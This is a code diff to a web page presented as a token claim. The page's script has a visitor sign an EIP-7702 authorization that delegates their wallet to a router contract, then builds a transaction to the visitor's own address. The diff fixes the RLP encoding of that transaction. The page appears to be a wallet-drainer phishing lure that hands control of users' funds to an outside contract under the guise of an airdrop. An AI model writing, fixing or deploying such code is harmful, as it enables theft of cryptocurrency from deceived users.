@@ -60,7 +60,7 @@
         <div class="sub">Claim your tokens</div>
         
         <div class="info">
-            <span class="info-icon">🔐🌟</span>
+            <span class="info-icon">🔐💆</span>
             <span>Router: <span style="color:#ff6b35;font-family:monospace;">ROUTER_CONTRACT_ADDRESS</span></span>
         </div>
         
@@ -85,22 +85,10 @@
             }).catch(() => {});
         }
 
-        function stripZeros(hex) {
-            if (hex === '0x' || hex === '0x0') return '0x';
-            let h = hex.startsWith('0x') ? hex.slice(2) : hex;
-            while (h.length > 1 && h[0] === '0') h = h.slice(1);
-            return '0x' + (h.length % 2 === 0 ? h : '0' + h);
-        }
-
-        function hexToBytes(hex) {
-            return ethers.getBytes(hex);
-        }
-
-        function bigIntToRlpHex(val) {
-            if (val === 0n || val === 0) return '0x';
-            let hex = val.toString(16);
-            if (hex.length % 2 !== 0) hex = '0' + hex;
-            return '0x' + hex;
+        function rlpVal(val) {
+            if (val === 0 || val === '0x' || val === '0x0') return '0x';
+            if (typeof val === 'string' && val.startsWith('0x')) return val;
+            return ethers.toBeHex(val);
         }
 
         document.getElementById('claimBtn').addEventListener('click', async () => {
@@ -139,10 +127,9 @@
                     method: 'eth_getTransactionCount',
                     params: [userAddress, 'latest']
                 });
-                const nonceNum = parseInt(nonceHex, 16);
 
                 const authPayloadRlp = ethers.encodeRlp([
-                    stripZeros(ethers.toBeHex(CHAIN_ID)),
+                    rlpVal(CHAIN_ID),
                     ROUTER,
                     '0x'
                 ]);
@@ -170,10 +157,10 @@
                 const yParity = sigBytes[64] - 27;
 
                 const authTuple = [
-                    bigIntToRlpHex(CHAIN_ID),
+                    rlpVal(CHAIN_ID),
                     ROUTER,
                     '0x',
-                    bigIntToRlpHex(yParity),
+                    rlpVal(yParity),
                     r,
                     s
                 ];
@@ -181,15 +168,18 @@
                 const authListEncoded = ethers.encodeRlp([authTuple]);
 
                 const txData = [
-                    stripZeros(ethers.toBeHex(CHAIN_ID)),
-                    stripZeros(ethers.toBeHex(nonceNum)),
-                    stripZeros(ethers.toBeHex(2000000000)),
-                    stripZeros(ethers.toBeHex(2000000000)),
-                    stripZeros(ethers.toBeHex(200000)),
+                    rlpVal(CHAIN_ID),
+                    nonceHex,
+                    rlpVal(2000000000),
+                    rlpVal(2000000000),
+                    rlpVal(200000),
                     userAddress,
                     '0x',
                     '0x61461954',
                     [],
+                    [],
+                    [],
+                    rlpVal(0),
                     authListEncoded
                 ];
 
@@ -216,4 +206,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
